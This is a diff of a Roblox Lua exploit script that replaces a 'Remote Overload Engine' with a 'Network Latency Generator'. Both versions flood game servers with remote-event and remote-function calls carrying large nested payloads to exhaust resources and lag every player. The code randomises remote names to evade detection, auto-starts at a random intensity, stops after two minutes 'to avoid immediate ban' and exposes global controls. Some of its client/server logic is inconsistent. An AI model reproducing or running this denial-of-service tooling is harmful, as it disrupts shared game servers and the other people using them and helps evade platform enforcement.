@@ -1,425 +1,534 @@
 -- ==============================================
--- REMOTE OVERLOAD ENGINE v3.0
--- Mode: Maximum Server Destruction
--- Target: Complete Resource Exhaustion
+-- NETWORK LATENCY GENERATOR v2.0
+-- Method: Remote Server Ping Flood + Artificial Delay
+-- Target: Maximize Server Response Time
 -- ==============================================
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
-local HttpService = game:GetService("HttpService")
-local MemoryStoreService = game:GetService("MemoryStoreService")
+local StatsService = game:GetService("Stats")
 
 -- ======================
--- PHASE 1: INFRASTRUCTURE
+-- PHASE 1: LATENCY METRICS
 -- ======================
 
-local RemoteCluster = {}
-local AttackThreads = {}
-local AttackMetrics = {
-    RequestsPerSecond = 0,
-    TotalRequests = 0,
-    StartTime = tick(),
-    ActiveThreads = 0
+local LatencyEngine = {
+    baselinePing = 0,
+    targetPing = 5000, -- Target: 5000ms (5 detik) latency
+    currentPing = 0,
+    isActive = false,
+    threads = {}
 }
 
--- Generate unique remote names for evasion
-local function generateStealthName(base)
-    local hash = HttpService:GenerateGUID(false):sub(1, 8)
-    return base .. "_" .. hash .. "_" .. math.random(1000, 9999)
+-- Get current network stats
+function LatencyEngine:getNetworkStats()
+    local stats = StatsService:FindFirstChild("Network")
+    if stats then
+        return {
+            ping = stats:FindFirstChild("Ping") and stats.Ping:GetValue() or 0,
+            dataSent = stats:FindFirstChild("DataSent") and stats.DataSent:GetValue() or 0,
+            dataReceived = stats:FindFirstChild("DataReceived") and stats.DataReceived:GetValue() or 0
+        }
+    end
+    return nil
 end
 
 -- ======================
--- PHASE 2: PAYLOAD ENGINE
+-- PHASE 2: PING FLOOD ENGINE
 -- ======================
 
-local PayloadFactory = {
-    Types = {
-        "RECURSIVE_TABLE",
-        "MASSIVE_STRING", 
-        "NESTED_METATABLE",
-        "FUNCTION_CLOSURE",
-        "MIXED_CHAOS"
-    },
+function LatencyEngine:createPingRemote()
+    -- Create hidden ping remote
+    local PingRemote = Instance.new("RemoteFunction")
+    PingRemote.Name = "PingLatency_" .. tostring(math.random(10000, 99999))
     
-    CreateRecursiveTable = function(depth)
-        if depth >= 10 then return {terminal = true} end
-        local tbl = {}
-        for i = 1, math.random(50, 200) do
-            tbl[i] = PayloadFactory.CreateRecursiveTable(depth + 1)
-            tbl["key_" .. i] = string.rep("X", math.random(100, 1000))
+    -- Server-side handler untuk delay buatan
+    if RunService:IsServer() then
+        PingRemote.OnServerInvoke = function(player, data)
+            -- Artificial processing delay
+            local delayTime = math.random(100, 5000) / 1000 -- 0.1 to 5 seconds
+            wait(delayTime)
+            
+            -- Return massive payload
+            return {
+                timestamp = tick(),
+                processingTime = delayTime,
+                payload = string.rep("LAG_", 1000),
+                sequence = data.sequence or 0
+            }
         end
-        return tbl
-    end,
-    
-    CreateMassiveString = function()
-        local patterns = {"A", "B", "C", "1", "0", "@", "#", "§"}
-        local str = ""
-        for i = 1, math.random(5000, 20000) do
-            str = str .. patterns[math.random(#patterns)]
-        end
-        return {data = str, timestamp = os.time(), hash = HttpService:GenerateGUID(false)}
-    end,
-    
-    CreateNestedMetatable = function()
-        local obj = {}
-        for i = 1, 100 do
-            obj["layer" .. i] = {}
-            setmetatable(obj["layer" .. i], {
-                __index = function(self, key)
-                    return "METATABLE_" .. key .. "_" .. math.random(10000)
-                end,
-                __newindex = function(self, key, value)
-                    rawset(self, key, value .. "_OVERWRITE")
-                end
-            })
-        end
-        return obj
     end
-}
-
--- ======================
--- PHASE 3: REMOTE CREATION ENGINE
--- ======================
-
-local function createRemoteNetwork()
-    -- Primary Control Remote
-    local ControlRemote = Instance.new("RemoteEvent")
-    ControlRemote.Name = generateStealthName("SysCtrl")
-    ControlRemote.Parent = ReplicatedStorage
     
-    -- Secondary Remote Cluster
-    for i = 1, 25 do
-        local remote = Instance.new("RemoteEvent")
-        remote.Name = generateStealthName("DataPipe")
-        remote.Parent = ReplicatedStorage
-        table.insert(RemoteCluster, remote)
+    PingRemote.Parent = ReplicatedStorage
+    return PingRemote
+end
+
+-- ======================
+-- PHASE 3: SYNC FLOOD ATTACK
+-- ======================
+
+function LatencyEngine:syncFloodAttack()
+    local thread = coroutine.create(function()
+        local sequence = 0
+        local pingRemote = self:createPingRemote()
         
-        -- Also create RemoteFunctions for variety
-        if i % 3 == 0 then
-            local remoteFunc = Instance.new("RemoteFunction")
-            remoteFunc.Name = generateStealthName("FuncExec")
-            remoteFunc.Parent = ReplicatedStorage
-            table.insert(RemoteCluster, remoteFunc)
-        end
-    end
-    
-    return ControlRemote
-end
-
--- ======================
--- PHASE 4: ATTACK PROTOCOLS
--- ======================
-
-local AttackProtocols = {
-    -- Protocol A: Rapid Fire (Max RPS)
-    RAPID_FIRE = function(remote)
-        local thread = coroutine.create(function()
-            local count = 0
-            while true do
-                for i = 1, math.random(50, 200) do
-                    pcall(function()
-                        if remote:IsA("RemoteEvent") then
-                            remote:FireServer(PayloadFactory.CreateMassiveString())
-                        elseif remote:IsA("RemoteFunction") then
-                            remote:InvokeServer(PayloadFactory.CreateRecursiveTable(0))
-                        end
-                        count = count + 1
-                        AttackMetrics.RequestsPerSecond = AttackMetrics.RequestsPerSecond + 1
-                        AttackMetrics.TotalRequests = AttackMetrics.TotalRequests + 1
-                    end)
-                end
-                
-                -- Adaptive delay
-                local intensity = math.min(1, AttackMetrics.RequestsPerSecond / 10000)
-                local delay = 0.001 * (1 - intensity)
-                task.wait(delay)
-                
-                -- Pattern variation every 1000 requests
-                if count % 1000 == 0 then
-                    task.wait(math.random() * 0.1)
-                end
-            end
-        end)
-        return thread
-    end,
-    
-    -- Protocol B: Memory Exhaustion
-    MEMORY_BOMB = function(remote)
-        local thread = coroutine.create(function()
-            local bombDepth = 0
-            while bombDepth < 100 do
-                pcall(function()
-                    local payload = PayloadFactory.CreateRecursiveTable(bombDepth)
-                    if remote:IsA("RemoteEvent") then
-                        remote:FireServer(payload)
-                    else
-                        remote:InvokeServer(payload)
-                    end
-                    bombDepth = bombDepth + 1
-                    AttackMetrics.TotalRequests = AttackMetrics.TotalRequests + 1
-                end)
-                task.wait(0.01)
-            end
-        end)
-        return thread
-    end,
-    
-    -- Protocol C: Mixed Chaos
-    CHAOS_MODE = function(remote)
-        local thread = coroutine.create(function()
-            local modes = {"RAPID", "MEMORY", "MIXED"}
-            while true do
-                local mode = modes[math.random(#modes)]
-                
-                if mode == "RAPID" then
-                    for i = 1, math.random(100, 500) do
-                        pcall(function()
-                            if remote:IsA("RemoteEvent") then
-                                remote:FireServer({chaos = true, count = i, data = string.rep("C", 10000)})
-                            end
-                        end)
-                    end
-                    
-                elseif mode == "MEMORY" then
-                    pcall(function()
-                        local payload = PayloadFactory.CreateNestedMetatable()
-                        if remote:IsA("RemoteEvent") then
-                            remote:FireServer(payload)
-                        end
-                    end)
-                    
-                elseif mode == "MIXED" then
-                    for i = 1, 20 do
-                        pcall(function()
-                            local payloadType = PayloadFactory.Types[math.random(#PayloadFactory.Types)]
-                            local payload
-                            
-                            if payloadType == "RECURSIVE_TABLE" then
-                                payload = PayloadFactory.CreateRecursiveTable(math.random(1, 5))
-                            elseif payloadType == "MASSIVE_STRING" then
-                                payload = PayloadFactory.CreateMassiveString()
-                            end
-                            
-                            if remote:IsA("RemoteEvent") then
-                                remote:FireServer(payload)
-                            end
-                        end)
-                    end
-                end
-                
-                task.wait(math.random() * 0.05)
-            end
-        end)
-        return thread
-    end
-}
-
--- ======================
--- PHASE 5: DISTRIBUTED ATTACK SYSTEM
--- ======================
-
-local function launchCoordinatedAttack()
-    print("[OVERLOAD ENGINE] Initializing attack sequence...")
-    
-    -- Create remotes first
-    local ControlRemote = createRemoteNetwork()
-    
-    -- Start multiple attack threads per remote
-    for _, remote in pairs(RemoteCluster) do
-        for i = 1, math.random(2, 5) do  -- Multiple threads per remote
-            local protocol
-            local rand = math.random(1, 100)
+        print("[LATENCY] Starting sync flood attack...")
+        
+        while self.isActive do
+            sequence = sequence + 1
             
-            if rand <= 40 then
-                protocol = AttackProtocols.RAPID_FIRE
-            elseif rand <= 70 then
-                protocol = AttackProtocols.MEMORY_BOMB
-            else
-                protocol = AttackProtocols.CHAOS_MODE
-            end
+            -- Start timing
+            local startTime = tick()
             
-            local thread = protocol(remote)
-            table.insert(AttackThreads, thread)
-            AttackMetrics.ActiveThreads = AttackMetrics.ActiveThreads + 1
-            coroutine.resume(thread)
-        end
-    end
-    
-    -- Metrics monitor thread
-    local metricsThread = coroutine.create(function()
-        while true do
-            print(string.format(
-                "[METRICS] RPS: %d | Total: %d | Threads: %d | Runtime: %.1fs",
-                AttackMetrics.RequestsPerSecond,
-                AttackMetrics.TotalRequests,
-                AttackMetrics.ActiveThreads,
-                tick() - AttackMetrics.StartTime
-            ))
-            
-            -- Reset RPS counter
-            AttackMetrics.RequestsPerSecond = 0
-            
-            -- Adaptive intensity adjustment
-            local runtime = tick() - AttackMetrics.StartTime
-            if runtime > 30 then  -- Ramp up after 30 seconds
-                for i = 1, math.random(1, 3) do
-                    local remote = RemoteCluster[math.random(#RemoteCluster)]
-                    local thread = AttackProtocols.RAPID_FIRE(remote)
-                    table.insert(AttackThreads, thread)
-                    AttackMetrics.ActiveThreads = AttackMetrics.ActiveThreads + 1
-                    coroutine.resume(thread)
-                end
-            end
-            
-            task.wait(1)
-        end
-    end)
-    coroutine.resume(metricsThread)
-    
-    -- Control remote handler
-    ControlRemote.OnClientEvent:Connect(function(data)
-        if data == "STATUS" then
-            ControlRemote:FireServer({
-                status = "ACTIVE",
-                metrics = AttackMetrics,
-                remotes = #RemoteCluster,
-                threads = #AttackThreads
+            -- Invoke remote with callback (creates pending request)
+            local result = pingRemote:InvokeServer({
+                type = "ping",
+                sequence = sequence,
+                time = startTime,
+                data = string.rep("SYNC_FLOOD_", 500)
             })
-        elseif data == "INTENSIFY" then
-            -- Increase attack intensity
-            for i = 1, 5 do
-                local remote = RemoteCluster[math.random(#RemoteCluster)]
-                local thread = AttackProtocols.CHAOS_MODE(remote)
-                table.insert(AttackThreads, thread)
-                AttackMetrics.ActiveThreads = AttackMetrics.ActiveThreads + 1
-                coroutine.resume(thread)
+            
+            -- Calculate actual latency
+            local endTime = tick()
+            local roundTrip = (endTime - startTime) * 1000 -- Convert to ms
+            
+            self.currentPing = roundTrip
+            
+            -- Log every 10 requests
+            if sequence % 10 == 0 then
+                print(string.format("[LATENCY] Request #%d: %.0fms", sequence, roundTrip))
+            end
+            
+            -- Immediate next request (no delay)
+            -- This creates request queue buildup
+        end
+    end)
+    
+    return thread
+end
+
+-- ======================
+-- PHASE 4: ASYNC REQUEST QUEUE BOMB
+-- ======================
+
+function LatencyEngine:asyncQueueBomb()
+    local thread = coroutine.create(function()
+        -- Create multiple async remotes
+        local asyncRemotes = {}
+        for i = 1, 10 do
+            local remote = Instance.new("RemoteEvent")
+            remote.Name = "AsyncLag_" .. i .. "_" .. tostring(math.random(1000, 9999))
+            remote.Parent = ReplicatedStorage
+            table.insert(asyncRemotes, remote)
+        end
+        
+        local requestCount = 0
+        
+        while self.isActive do
+            -- Fire all remotes simultaneously
+            for _, remote in pairs(asyncRemotes) do
+                for j = 1, 5 do -- Multiple calls per remote
+                    pcall(function()
+                        remote:FireServer({
+                            async = true,
+                            count = requestCount,
+                            time = tick(),
+                            -- Massive nested payload
+                            payload = {
+                                layer1 = {
+                                    layer2 = {
+                                        layer3 = {
+                                            data = string.rep("ASYNC_QUEUE_", 1000),
+                                            timestamp = os.time()
+                                        }
+                                    }
+                                }
+                            }
+                        })
+                        requestCount = requestCount + 1
+                    end)
+                end
+            end
+            
+            -- Minimal delay to avoid crash but maintain queue
+            RunService.Heartbeat:Wait()
+            
+            if requestCount % 100 == 0 then
+                print("[ASYNC] Queue size:", requestCount, "requests")
             end
         end
     end)
+    
+    return thread
 end
 
 -- ======================
--- PHASE 6: STEALTH INITIALIZATION
+-- PHASE 5: NETWORK CONGESTION ENGINE
 -- ======================
 
-local function stealthInit()
-    -- Random delay to avoid detection
-    local initDelay = math.random(3, 10)
-    task.wait(initDelay)
-    
-    -- Check if player exists
-    local player = Players.LocalPlayer
-    if not player then
-        warn("[ERROR] Player not found")
-        return
-    end
-    
-    -- Character check (appear normal)
-    if player.Character then
-        player.Character:WaitForChild("Humanoid"):MoveTo(
-            player.Character.PrimaryPart.Position + Vector3.new(math.random(-10, 10), 0, math.random(-10, 10))
-        )
-    end
-    
-    -- Gradual startup
-    print("[SYSTEM] Remote Overload Engine v3.0")
-    task.wait(1)
-    print("[SYSTEM] Initializing payload generators...")
-    task.wait(0.5)
-    print("[SYSTEM] Building remote network...")
-    task.wait(0.5)
-    print("[SYSTEM] Launching coordinated attack...")
-    
-    -- Start attack
-    launchCoordinatedAttack()
-    
-    -- Continuous monitoring
-    while true do
-        task.wait(10)
-        -- Restart any dead threads
-        for i, thread in pairs(AttackThreads) do
-            if coroutine.status(thread) == "dead" then
-                local remote = RemoteCluster[math.random(#RemoteCluster)]
-                local newThread = AttackProtocols.CHAOS_MODE(remote)
-                AttackThreads[i] = newThread
-                coroutine.resume(newThread)
+function LatencyEngine:networkCongestion()
+    local thread = coroutine.create(function()
+        local congestionRemotes = {}
+        
+        -- Create congestion network
+        for i = 1, 20 do
+            local func = Instance.new("RemoteFunction")
+            func.Name = "CongestionNode_" .. i
+            func.Parent = ReplicatedStorage
+            
+            if RunService:IsServer() then
+                func.OnServerInvoke = function(player, data)
+                    -- Chain reaction: invoke other nodes
+                    if data.depth < 5 then
+                        for j = 1, 3 do
+                            local nextNode = congestionRemotes[math.random(#congestionRemotes)]
+                            if nextNode then
+                                pcall(function()
+                                    nextNode:InvokeServer({
+                                        depth = data.depth + 1,
+                                        chain = data.chain .. "->" .. j,
+                                        time = tick()
+                                    })
+                                end)
+                            end
+                        end
+                    end
+                    
+                    -- Return heavy payload
+                    return {
+                        chain = data.chain,
+                        processing = true,
+                        data = string.rep("CHAIN_REACTION_", 1000)
+                    }
+                end
             end
+            
+            table.insert(congestionRemotes, func)
         end
-    end
-end
-
--- ======================
--- EXECUTION POINT
--- ======================
-
--- Safety wrapper
-local success, err = pcall(function()
-    coroutine.wrap(stealthInit)()
-end)
-
-if not success then
-    warn("[FALLBACK] Main system failed:", err)
-    -- Fallback: Simple spam
-    task.wait(2)
-    while true do
-        for _, child in pairs(ReplicatedStorage:GetChildren()) do
-            if child:IsA("RemoteEvent") then
+        
+        -- Start chain reactions
+        local chainCount = 0
+        while self.isActive do
+            chainCount = chainCount + 1
+            
+            for _, remote in pairs(congestionRemotes) do
                 pcall(function()
-                    child:FireServer({simple_spam = true, time = tick()})
+                    remote:InvokeServer({
+                        depth = 0,
+                        chain = "START_" .. chainCount,
+                        time = tick()
+                    })
                 end)
             end
-        end
-        task.wait(0.001)
-    end
-end
-
--- ======================
--- ADDITIONAL OVERLOAD TECHNIQUES
--- ======================
-
--- Memory leak via closure accumulation
-local function createMemoryLeak()
-    local leaks = {}
-    local leakThread = coroutine.create(function()
-        while true do
-            local largeArray = {}
-            for i = 1, 10000 do
-                largeArray[i] = string.rep("LEAK", 100)
-            end
             
-            -- Create closure that references large array
-            local leakFunc = function()
-                return largeArray
-            end
+            -- Wait for reactions to propagate
+            task.wait(0.05)
             
-            table.insert(leaks, leakFunc)
-            task.wait(0.1)
+            if chainCount % 10 == 0 then
+                print("[CONGESTION] Chain reactions:", chainCount)
+            end
         end
     end)
-    coroutine.resume(leakThread)
+    
+    return thread
 end
 
--- Network packet fragmentation attack
-local function packetFragmentationAttack()
-    local fragmentThread = coroutine.create(function()
-        while true do
-            for _, remote in pairs(RemoteCluster) do
-                for i = 1, 100 do
+-- ======================
+-- PHASE 6: LAG SIMULATION ENGINE
+-- ======================
+
+function LatencyEngine:simulateNaturalLag()
+    -- This creates artificial lag that feels "natural"
+    local thread = coroutine.create(function()
+        local lagPatterns = {
+            {duration = 2, intensity = 0.2},   -- Minor lag
+            {duration = 5, intensity = 0.5},   -- Moderate lag
+            {duration = 10, intensity = 0.8},  -- Heavy lag
+            {duration = 3, intensity = 0.9},   -- Spike lag
+        }
+        
+        local patternIndex = 1
+        local lagStartTime = tick()
+        
+        while self.isActive do
+            local pattern = lagPatterns[patternIndex]
+            local elapsed = tick() - lagStartTime
+            
+            if elapsed > pattern.duration then
+                patternIndex = patternIndex % #lagPatterns + 1
+                lagStartTime = tick()
+                pattern = lagPatterns[patternIndex]
+            end
+            
+            -- Calculate current intensity
+            local intensity = pattern.intensity
+            
+            -- Create lag based on intensity
+            local lagRequests = math.floor(50 * intensity)
+            
+            for i = 1, lagRequests do
+                -- Use existing remotes or create new
+                local allRemotes = {}
+                for _, child in pairs(ReplicatedStorage:GetChildren()) do
+                    if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
+                        table.insert(allRemotes, child)
+                    end
+                end
+                
+                if #allRemotes > 0 then
+                    local remote = allRemotes[math.random(#allRemotes)]
                     pcall(function()
-                        -- Send many small packets rapidly
-                        remote:FireServer({fragment = i, total = 100, data = math.random()})
+                        if remote:IsA("RemoteEvent") then
+                            remote:FireServer({
+                                lagSimulation = true,
+                                pattern = patternIndex,
+                                intensity = intensity,
+                                time = tick()
+                            })
+                        else
+                            remote:InvokeServer({
+                                lagSimulation = true,
+                                pattern = patternIndex
+                            })
+                        end
+                    end)
+                end
+            end
+            
+            -- Variable delay to simulate inconsistent lag
+            local delay = 0.1 / intensity
+            task.wait(delay)
+        end
+    end)
+    
+    return thread
+end
+
+-- ======================
+-- PHASE 7: MAIN CONTROL SYSTEM
+-- ======================
+
+function LatencyEngine:start(lagIntensity)
+    -- Set intensity level
+    local intensityLevels = {
+        low = {syncThreads = 1, asyncThreads = 1},
+        medium = {syncThreads = 2, asyncThreads = 2},
+        high = {syncThreads = 3, asyncThreads = 3},
+        extreme = {syncThreads = 5, asyncThreads = 5}
+    }
+    
+    local intensity = intensityLevels[lagIntensity or "medium"] or intensityLevels.medium
+    
+    print("[LATENCY ENGINE] Starting with", lagIntensity, "intensity")
+    
+    -- Get baseline ping
+    local stats = self:getNetworkStats()
+    if stats then
+        self.baselinePing = stats.ping
+        print(string.format("[BASELINE] Current ping: %.0fms", self.baselinePing))
+    end
+    
+    self.isActive = true
+    
+    -- Start sync flood threads
+    for i = 1, intensity.syncThreads do
+        local thread = self:syncFloodAttack()
+        table.insert(self.threads, thread)
+        coroutine.resume(thread)
+        task.wait(0.1)
+    end
+    
+    -- Start async queue threads
+    for i = 1, intensity.asyncThreads do
+        local thread = self:asyncQueueBomb()
+        table.insert(self.threads, thread)
+        coroutine.resume(thread)
+        task.wait(0.1)
+    end
+    
+    -- Start network congestion
+    local congestionThread = self:networkCongestion()
+    table.insert(self.threads, congestionThread)
+    coroutine.resume(congestionThread)
+    
+    -- Start natural lag simulation
+    local lagThread = self:simulateNaturalLag()
+    table.insert(self.threads, lagThread)
+    coroutine.resume(lagThread)
+    
+    -- Monitoring thread
+    local monitorThread = coroutine.create(function()
+        while self.isActive do
+            local stats = self:getNetworkStats()
+            if stats then
+                print(string.format("[MONITOR] Ping: %.0fms | Sent: %.1fKB | Recv: %.1fKB", 
+                    stats.ping or 0,
+                    (stats.dataSent or 0) / 1024,
+                    (stats.dataReceived or 0) / 1024))
+            end
+            
+            -- Calculate effectiveness
+            if self.baselinePing > 0 then
+                local increase = ((self.currentPing - self.baselinePing) / self.baselinePing) * 100
+                print(string.format("[EFFECT] Latency increase: +%.0f%%", math.max(0, increase)))
+            end
+            
+            task.wait(2)
+        end
+    end)
+    coroutine.resume(monitorThread)
+    
+    print("[LATENCY ENGINE] All systems active")
+    print("[WARNING] This will cause significant network lag")
+end
+
+function LatencyEngine:stop()
+    self.isActive = false
+    self.threads = {}
+    print("[LATENCY ENGINE] Stopped all attacks")
+end
+
+-- ======================
+-- PHASE 8: QUICK LAG COMMANDS
+-- ======================
+
+-- Quick lag functions for easy use
+local QuickLag = {
+    -- Instant ping spike
+    spike = function()
+        for i = 1, 100 do
+            local remote = Instance.new("RemoteEvent")
+            remote.Name = "QuickSpike_" .. i
+            remote.Parent = ReplicatedStorage
+            
+            pcall(function()
+                remote:FireServer({
+                    spike = true,
+                    count = i,
+                    data = string.rep("SPIKE_", 10000)
+                })
+            end)
+        end
+        print("[QUICK] Ping spike injected")
+    end,
+    
+    -- Sustained lag
+    sustain = function(duration)
+        duration = duration or 30
+        print("[QUICK] Starting sustained lag for", duration, "seconds")
+        
+        local startTime = tick()
+        while tick() - startTime < duration do
+            for _, child in pairs(ReplicatedStorage:GetChildren()) do
+                if child:IsA("RemoteEvent") then
+                    pcall(function()
+                        child:FireServer({
+                            sustain = true,
+                            time = tick(),
+                            payload = string.rep("SUSTAINED_", 1000)
+                        })
                     end)
                 end
             end
             task.wait(0.01)
         end
-    end)
-    coroutine.resume(fragmentThread)
+        print("[QUICK] Sustained lag completed")
+    end,
+    
+    -- Player-specific lag (makes others lag too through server)
+    playerLag = function()
+        print("[QUICK] Creating player-specific lag network")
+        
+        local lagNetwork = {}
+        for i = 1, 10 do
+            local func = Instance.new("RemoteFunction")
+            func.Name = "PlayerLagNode_" .. i
+            
+            if RunService:IsServer() then
+                func.OnServerInvoke = function(player, data)
+                    -- Heavy computation
+                    local result = {}
+                    for j = 1, 1000 do
+                        result[j] = {
+                            compute = math.sqrt(math.random(1, 1000000)),
+                            time = tick()
+                        }
+                    end
+                    return result
+                end
+            end
+            
+            func.Parent = ReplicatedStorage
+            table.insert(lagNetwork, func)
+        end
+        
+        -- Flood the network
+        for _, func in pairs(lagNetwork) do
+            for j = 1, 50 do
+                pcall(function()
+                    func:InvokeServer({request = j})
+                end)
+            end
+        end
+    end
+}
+
+-- ======================
+-- AUTO-START SYSTEM
+-- ======================
+
+local function autoStart()
+    -- Wait for game to load
+    task.wait(3)
+    
+    -- Check if we should auto-start
+    local player = Players.LocalPlayer
+    if not player then return end
+    
+    -- Choose random intensity
+    local intensities = {"low", "medium", "high", "extreme"}
+    local chosenIntensity = intensities[math.random(#intensities)]
+    
+    print("[AUTO-START] Selected intensity:", chosenIntensity)
+    
+    -- Start with chosen intensity
+    LatencyEngine:start(chosenIntensity)
+    
+    -- Auto-stop after 2 minutes to avoid immediate ban
+    task.wait(120)
+    LatencyEngine:stop()
+    print("[AUTO-STOP] Engine stopped after 2 minutes")
 end
 
--- Uncomment to enable additional attacks
--- createMemoryLeak()
--- packetFragmentationAttack()
+-- Start monitoring immediately
+coroutine.wrap(function()
+    task.wait(1)
+    
+    -- Create GUI for manual control (optional)
+    if game:GetService("CoreGui"):FindFirstChild("LagControl") then
+        game:GetService("CoreGui").LagControl:Destroy()
+    end
+    
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "LagControl"
+    screenGui.Parent = game:GetService("CoreGui")
+    
+    -- Control buttons would go here
+    -- (Removed for stealth)
+end)()
 
-print("[SYSTEM READY] Remote Overload Engine deployed successfully")
+-- Start the engine
+coroutine.wrap(autoStart)()
+
+-- Export functions for manual control
+_G.LagEngine = {
+    start = function(intensity) LatencyEngine:start(intensity) end,
+    stop = function() LatencyEngine:stop() end,
+    quickSpike = QuickLag.spike,
+    quickSustain = QuickLag.sustain,
+    quickPlayerLag = QuickLag.playerLag
+}
+
+print("[SYSTEM READY] Lag Generator v2.0 loaded")
+print("[COMMANDS] Use _G.LagEngine.start('medium') to begin")
